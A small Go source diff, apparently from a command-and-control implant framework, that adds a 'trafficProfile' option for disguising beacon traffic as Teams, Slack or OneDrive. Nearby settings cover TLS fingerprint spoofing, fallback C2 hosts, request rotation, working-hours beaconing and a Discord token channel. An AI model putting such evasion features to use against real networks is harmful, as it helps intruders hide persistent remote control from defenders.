@@ -28,6 +28,7 @@ var (
 	tlsFingerprint string = ""     // TLS ClientHello fingerprint: chrome, firefox, safari, edge, random, go (default)
 	fallbackHosts  string = ""     // Comma-separated fallback C2 URLs for automatic failover
 	contentTypes   string = ""     // Comma-separated Content-Type values for request rotation
+	trafficProfile string = ""     // Traffic blending profile: teams, slack, onedrive (empty = generic)
 	// bodyTransforms removed: use httpx C2 profile for malleable transforms
 	workingHoursStart      string = "" // Working hours start (HH:MM, 24hr local time)
 	workingHoursEnd        string = "" // Working hours end (HH:MM, 24hr local time)
@@ -86,6 +87,7 @@ func clearGlobals() {
 	tlsFingerprint = ""
 	fallbackHosts = ""
 	contentTypes = ""
+	trafficProfile = ""
 	tcpBindAddress = ""
 	namedPipeBindName = ""
 	discordBotToken = ""
